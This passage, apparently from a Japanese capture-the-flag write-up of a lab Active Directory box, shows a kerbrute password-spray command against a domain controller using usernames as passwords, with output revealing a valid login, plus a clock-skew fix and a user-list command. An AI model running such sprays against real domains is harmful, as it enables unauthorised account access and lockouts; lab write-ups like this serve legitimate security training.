### KerbruteでJoeアカウントをブルートフォース

```
┌──(kali㉿kali)-[~]
└─$ ./kerberoast/kerbrute passwordspray -v --user-as-pass --dc 10.10.10.172 -d megabank.local users_172.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 12/28/21 - Ronnie Flathers @ropnop

2021/12/28 04:37:15 >  Using KDC(s):
2021/12/28 04:37:15 >   10.10.10.172:88

2021/12/28 04:37:16 >  [!] Guest@megabank.local:Guest - USER LOCKED OUT
2021/12/28 04:37:16 >  [!] svc-bexec@megabank.local:svc-bexec - Invalid password
2021/12/28 04:37:16 >  [!] roleary@megabank.local:roleary - Invalid password
2021/12/28 04:37:16 >  [!] mhope@megabank.local:mhope - Invalid password
2021/12/28 04:37:16 >  [!] svc-ata@megabank.local:svc-ata - Invalid password
2021/12/28 04:37:16 >  [!] AAD_987d7f2f57d2@megabank.local:AAD_987d7f2f57d2 - Invalid password
2021/12/28 04:37:16 >  [!] svc-netapp@megabank.local:svc-netapp - Invalid password
2021/12/28 04:37:16 >  [!] dgalanos@megabank.local:dgalanos - Invalid password
2021/12/28 04:37:16 >  [!] smorgan@megabank.local:smorgan - Invalid password
2021/12/28 04:37:17 >  [+] VALID LOGIN:  SABatchJobs@megabank.local:SABatchJobs
2021/12/28 04:37:17 >  Done! Tested 10 logins (1 successes) in 1.259 seconds
```

[＊] `Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`っていうエラーは、自分のkali上で設定している時間とターゲット側の時間設定のズレが大きいため生じる。
次を実行すればよい：

```
┌──(kali㉿kali)-[~]
└─$ sudo ntpdate <Target's IP address>                                                                                                                                                                             1 ⨯
[sudo] password for kali: 
i28 Dec 04:35:35 ntpdate[2357]: step time server 10.10.10.172 offset +3600.717747 sec
```

**（ユーザリストの作り方）**

```
cat user_rawdata.txt | cut -d "[" -f 2 | cut -d "]" -f 1
```
